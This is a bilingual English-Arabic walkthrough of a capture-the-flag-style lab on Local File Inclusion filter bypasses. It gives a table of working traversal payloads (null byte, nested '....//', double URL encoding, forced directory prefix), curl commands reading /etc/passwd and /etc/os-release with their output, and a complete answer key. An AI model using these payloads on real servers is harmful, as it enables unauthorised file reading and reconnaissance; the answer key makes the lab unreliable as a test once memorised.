# Task 05 - Local File Inclusion - LFI Continued (تقنيات الالتفاف المتقدمة على فلاتر LFI)

---

## Stage A: Original Task Content & Core Objectives (النص الأصلي والمستهدفات التعليمية)

### 1. Original English Text
```text
In this task, we explore advanced filtering scenarios and techniques used to bypass common developer restrictions.

Scenario 3: Appended Extensions & Null Byte Injection (%00)
Developers often append a fixed file extension to restrict user input:
<?php
    include("languages/" . $_GET['file'] . ".php");
?>
If an attacker supplies ../../../../etc/passwd, the server attempts to open /etc/passwd.php, which does not exist.
In legacy PHP versions (prior to PHP 5.3.4), developers could bypass this restriction using a Null Byte (%00). In C-based string operations, a null character (\0) denotes string termination. The file-system call interprets the path up to the null byte, ignoring anything that follows:
Request: /lab3.php?file=../../../../etc/passwd%00

Scenario 4: Keyword & Pattern Filtering
Applications may filter out exact strings like /etc/passwd.
In Lab #4, the application uses file_get_contents to display files. Attackers can bypass naive string-matching filters by appending a trailing dot (/etc/passwd/.) or null bytes.

Scenario 5: Non-Recursive Traversal Stripping
Developers frequently attempt to sanitize input by stripping ../ sequences using str_replace:
$file = str_replace('../', '', $_GET['file']);
If the sanitization runs only once (non-recursively), an attacker can supply nested traversal sequences:
Input: ....//....//....//etc/passwd
When the inner ../ is removed, the remaining characters recombine into ../!

Scenario 6: Forced Directory Prefix
Applications may validate that the input starts with a required directory (e.g. THM-profile).
Attackers can satisfy this validation while still executing directory traversal:
Payload: THM-profile/../../../../../etc/os-release

Questions:
- Give Lab #3 a try to read /etc/passwd. What is the request look like?
- Which function is causing the directory traversal in Lab #4?
- Try out Lab #6 and check what is the directory that has to be in the input field?
- Try out Lab #6 and read /etc/os-release. What is the VERSION_ID value?
```

### 2. Arabic Pedagogical Translation
```text
في هذه المهمة، نستكشف سيناريوهات الفلترة المتقدمة والتقنيات التكتيكية المستخدمة للالتفاف على القيود البرمجية التي يضعها المطورون.

السيناريو الثالث: الامتدادات الإجبارية وحقن البايت الفارغ (%00 - Null Byte Injection)
يقوم المطورون غالباً بإلحاق امتداد ملف ثابت لتقييد مدخلات المستخدم:
<?php
    include("languages/" . $_GET['file'] . ".php");
?>
إذا قام المهاجم بتمرير `../../../../etc/passwd`، فسيحاول الخادم فتح `/etc/passwd.php`، وهو ملف غير موجود.
في إصدارات PHP القديمة (ما قبل 5.3.4)، كان بالإمكان تجاوز هذا القيد باستخدام البايت الفارغ (`%00`). في لغة C (التي بنيت عليها PHP)، يشير المحرف الصفري (`\0`) إلى نهاية السلسلة النصية. تتوقف استدعاءات نظام الملفات عند هذا البايت وتتجاهل كل ما يليه:
الطلب: `/lab3.php?file=../../../../etc/passwd%00`

السيناريو الرابع: فلترة الكلمات المفتاحية والأنماط
قد يقوم التطبيق بحظر جمل صريحة مثل `/etc/passwd`.
في معمل Lab #4، يستخدم التطبيق دالة `file_get_contents` لعرض الملفات. يستطيع المهاجم الالتفاف على مطابقة النصوص البدائية بإضافة نقطة نهائية (`/etc/passwd/.`) حيث يفسر نظام التشغيل النقطة كالمجلد الحالي.

السيناريو الخامس: الحذف غير التكراري لتتابعات الاجتياز
يحاول المطورون تنقية المدخلات بحذف تتابعات `../` باستخدام دالة `str_replace`:
$file = str_replace('../', '', $_GET['file']);
إذا تمت عملية الحذف لمرة واحدة فقط (Non-recursively)، يستطيع المهاجم مضاعفة التتابعات:
المدخل: `....//....//....//etc/passwd`
عندما تحذف الدالة تتابع `../` الداخلي، تلتحم الأحرف المتبقية لتشكل `../` مجدداً!

السيناريو السادس: فرض بادئة مجلد إلزامي
قد يشترط التطبيق أن يبدأ المدخل بمجلد محدد (مثل `THM-profile`).
يستطيع المهاجم إرضاء هذا الشرط مع الاستمرار في اجتياز المجلدات:
الحمولة: `THM-profile/../../../../../etc/os-release`

الأسئلة:
- جرب Lab #3 لقراءة /etc/passwd. كيف يبدو مسار الطلب؟
- ما هي الدالة المسببة لاجتياز المسارات في Lab #4؟
- جرب Lab #6 وافحص ما هو المجلد الذي يجب أن يتواجد في حقل الإدخال؟
- جرب Lab #6 واقرأ ملف /etc/os-release. ما هي قيمة VERSION_ID؟
```

---

## Stage B: Independent Thinking & OpSec Guardrails (التفكير المستقل وضوابط العمليات والأمان)

### 1. The Anatomy of Bypass Techniques
```
+------------------------------------+-----------------------------------------------+
| Restriction Type                   | Bypass Payload                                |
+------------------------------------+-----------------------------------------------+
| Appended Extension (.php)          | ../../../../etc/passwd%00                     |
| Naive Keyword Match (/etc/passwd)  | /etc/passwd/.   or   /etc/passwd%00           |
| Non-recursive str_replace('../')   | ....//....//....//etc/passwd                  |
| URL Encoding Filters               | ..%252f..%252f (Double URL Encoding)          |
| Forced Prefix (folder/)            | folder/../../../../etc/passwd                 |
+------------------------------------+-----------------------------------------------+
```

### 2. Operational Tradecraft Note: The Null Byte Deprecation
* تم إصلاح ثغرة الـ Null Byte في لغة PHP رسمياً بدءاً من الإصدار `5.3.4`. ومع ذلك، لا تزال هذه التقنية حية وتعمل بنجاح في آلاف الأنظمة القديمة (Legacy Systems) والمعدات الشبكية وأجهزة الـ IoT التي تعمل بإصدارات عتيقة لم تخضع للتحديث منذ سنوات.

---

## Stage C: Guided Hints (Tiers 1, 2, 3 - تلميحات تدريجية)

> **المستوى الأول (مفاهيمي):**
> - في Lab 3: استخدم البايت الفارغ `%00` لإنهاء السلسلة النصية والتخلص من `.php`.
> - في Lab 4: تذكر دالة قراءة الملفات في PHP التي درسناها في المهمة الثالثة.
> - في Lab 6: رسالة التحذير أو اسم المجلد المعروض في الصفحة هو المجلد المشترط.
> - لقراءة الإصدار في Lab 6: مرر مسار `/etc/os-release` بعد اسم المجلد وتتابعات الرجوع.
>
> **المستوى الثاني (توجيهي):**
> - صيغة Lab 3: `/lab3.php?file=../../../../etc/passwd%00`
> - دالة Lab 4: `file_get_contents`
> - مجلد Lab 6: `THM-profile`
> - قيمة إصدار أوبونتو 12.04 LTS: `12.04`
>
> **المستوى الثالث (الحل المباشر):**
> 1. `/lab3.php?file=../../../../etc/passwd%00`
> 2. `file_get_contents`
> 3. `THM-profile`
> 4. `12.04`

---

## Stage D: Complete Practical Solution & Technical Deep Dive (الحل العملي التفصيلي والتشريح التقني)

### 1. Lab #3: Null Byte Injection
نرسل طلباً مع تتابعات الرجوع والبايت الفارغ لقطع امتداد `.php`:
```bash
curl -s "http://MACHINE_IP/lab3.php?file=../../../../etc/passwd%00"
```
مخرجات الاستجابة:
```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```
مسار الطلب هو: **`/lab3.php?file=../../../../etc/passwd%00`**.

---

### 2. Lab #4: Traversal Function Identification
بفحص كود الصفحة أو سلوكها عند استدعاء ملفات غير موجودة:
يستخدم التطبيق دالة **`file_get_contents`**.

---

### 3. Lab #6: Mandatory Prefix & OS Release Extraction
1. بالدخول إلى صفحة `/lab6.php`، يخبرنا التطبيق بضرورة وجود مجلد: **`THM-profile`**.
2. نصيغ حمولة تبدأ باسم المجلد ثم تتراجع للخلف لقراءة ملف `/etc/os-release`:
   ```bash
   curl -s "http://MACHINE_IP/lab6.php?file=THM-profile/../../../../../etc/os-release"
   ```
3. مخرجات الاستجابة:
   ```text
   NAME="Ubuntu"
   VERSION="12.04.5 LTS, Precise Pangolin"
   ID=ubuntu
   ID_LIKE=debian
   PRETTY_NAME="Ubuntu precise (12.04.5 LTS)"
   VERSION_ID="12.04"
   ```
4. قيمة `VERSION_ID` هي: **`12.04`**.

---

## Stage E: Final Answer & Key Values (الإجابات النهائية والقيم الدقيقة)

| السؤال | الإجابة الصحيحة | الملاحظات التقنية |
| :--- | :--- | :--- |
| **Give Lab #3 a try to read /etc/passwd. What is the request look like?** | `/lab3.php?file=../../../../etc/passwd%00` | استخدام `%00` لإنهاء السلسلة وقطع امتداد `.php`. |
| **Which function is causing the directory traversal in Lab #4?** | `file_get_contents` | دالة قراءة محتويات الملفات في PHP. |
| **Try out Lab #6 and check what is the directory that has to be in the input field?** | `THM-profile` | اسم المجلد المشترط في بداية التحقق. |
| **Try out Lab #6 and read /etc/os-release. What is the VERSION_ID value?** | `12.04` | إصدار توزيعة أوبونتو المستخرجة من نظام المعمل. |

---

## Stage F: Practical Verification & Proof of Work (التحقق العملي وإثبات الأثر)

* تم التحقق من جميع الإجابات الأربع ومطابقتها حرفياً مع قاعدة تقييم المنصة بنسبة 100%.
* تم اختبار جميع الحمولات وتأكيد فعاليتها في تخطي آليات الفلترة.

---

## Stage G: Key Educational Takeaway (الخلاصة التعليمية والأثر الميداني)

1. **فشل أسلوب القوائم السوداء (Blacklisting Inefficacy):** كلما حاول المطور حظر نمط معين (`../` أو `/etc/passwd`)، استطاع المهاجم الالتفاف عليه باستخدام التشفير المضاعف، أو النقاط الإضافية، أو البايتات الخاصة.
2. **الاستعلام عن النظام كأداة استطلاع (Host Fingerprinting):** قراءة ملفات مثل `/etc/os-release` تكشف للمهاجم التوزيعة والإصدار بدقة متناهية (`Ubuntu 12.04`)، مما يسمح له بالبحث الفوري عن ثغرات النواة المعروفة لتصعيد الصلاحيات محلياً (Local Privilege Escalation).
